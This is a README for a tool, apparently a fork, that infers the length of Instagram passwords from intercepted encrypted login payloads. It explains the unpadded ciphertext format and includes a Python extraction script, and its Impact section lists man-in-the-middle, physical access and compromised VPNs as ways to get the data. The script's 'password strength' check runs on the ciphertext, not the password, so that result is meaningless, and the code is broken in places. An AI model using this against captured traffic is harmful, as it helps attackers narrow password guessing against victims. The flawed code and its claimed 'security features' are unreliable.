# InstaSecPass
Enhanced security for extracting the length of encrypted Instagram passwords

# Introduction
Instagram-Secure-Pass builds upon the original tool by providing additional security features and usability enhancements for managing encrypted Instagram passwords. Instagram and Facebook encrypt the passwords submitted at login before sending them to the server. Despite this, the encryption lacks padding, making it easy to extract the **password length** from the ciphertext.

# Encryption Phases
Instagram uses AES256-GCM to encrypt passwords, utilizing a 12-byte IV and a timestamp as Additional Data (AD). The current Instagram encryption configurations can be viewed at this [endpoint](https://www.instagram.com/data/shared_data/). For example:
```json
"encryption": {
  "key_id": "251",
  "public_key": "64c25328c4ba5e40f4e249310b861aa616488e096d4de6f2018c3c33c5e6d75c",
  "version": "10"
  }
```

Example ciphertext:
`#PWD_INSTAGRAM_BROWSER:10:1633796717:AY5QAElzjWV0j+OJ+qAnNXpQjZ6TN7A980Y2RMlrl63z80AkALvvb1IHYpzDXeX5w/Mf1jxTbF2PVJRh/Q99+J7FXkgmnE9qOhatEbKkdyoatN952Dee/PC8CiWLJTcoFDiCFovU9uwijaIDycIQ7w==`

The structure can be expressed as: 
`<app_type>:<encryption_version>:<timestamp>:<base64_ciphertext>`

Additionally, the ciphertext structure includes:
`key_id|encrypted_key|tag|aes_output`

This is an encryption pseudo-code example:
```
int[32] key = create_random_key();
int[12] iv = create_random_iv();
int[16] tag;
byte[] ad = get_timestamp();
string plaintext = password;

ciphertext = encrypt_aes_256_gcm(
  iv,
  key,
  tag,
  plaintext,
  ad 
);
```

# The Problem
By collecting two or more ciphertexts, we can observe that the ciphertext length depends on the plaintext length due to the lack of padding applied to the plaintext.

For example:
- Password length 8: `#PWD_INSTAGRAM_BROWSER:10:1633796644:AY5QAOHhnlwGkvikhrThjD0/XSZAVlJ+dFBGNAtG4JhnP5c42slFXO0H0xpE3W2JSlcdjDEDI1O/CioKL5zXhXCfkRpL+ItOqUB0jhpl/D3EcTEI9iTq0XSpmGDvxb7fwaCvNFv2xFj4lvsv`
- Password length 12: `#PWD_INSTAGRAM_BROWSER:10:1633796717:AY5QAElzjWV0j+OJ+qAnNXpQjZ6TN7A980Y2RMlrl63z80AkALvvb1IHYpzDXeX5w/Mf1jxTbF2PVJRh/Q99+J7FXkgmnE9qOhatEbKkdyoatN952Dee/PC8CiWLJTcoFDiCFovU9uwijaIDycIQ7w==`

Therefore, we need a way to extract the password length from the ciphertext.

# Calculate the Length
It is easy to calculate the password length by counting the ciphertext length and examining the base64 padding. We need to calculate:
1. The number of base64 blocks.
2. The number of '=' base64 pad characters.
3. The difference between the ciphertext length and a one-character password ciphertext length (136 chars).

The Python script below calculates the exact length of a password:
```python
import getpass
import re

def is_strong_password(password):
    # Check if password meets strength criteria (at least 8 characters, includes letters and numbers)
    if len(password) >= 8 and re.search(r"[A-Za-z]", password) and re.search(r"\d", password):
        return True
    return False

attempts = 0
max_attempts = 5
invalid_attempts = []

while attempts < max_attempts:
    enc = getpass.getpass('Insert encrypted password: ')
    attempts += 1

    if len(enc) < 3:
        print("Error: Password too short. Please provide a valid encrypted password.")
        invalid_attempts.append(enc)
        continue

    c = enc.split(':')[3] if ':' in enc else enc
    cl = len(c)
    pad = (int)((cl / 4) - 36)
    pad1 = 1 if c[-1] == '=' else 0
    pad2 = 1 if c[-2] == '=' else 0
    pl = (len(c) - 136 - pad - pad1 - pad2)

    if pl < 0:
        print("Error: Invalid encrypted password format.")
        invalid_attempts.append(enc)
    else:        
        print("Password length: " + str(pl))
        if is_strong_password(c):
            print("Password strength: Strong")
        else:
            print("Password strength: Weak")
        break
else:
    print("Error: Too many invalid attempts. Please try again later.")

# Log invalid attempts
if invalid_attempts:
    print("Invalid attempts were logged for review.")
```

# Impact
To exploit this, you need to intercept the communication between the client and server. Possible scenarios include:
1. An attacker has physical access to the victim's machine.
2. A MITM (Man-In-The-Middle) attack.
3. A compromised VPN that can read the traffic.

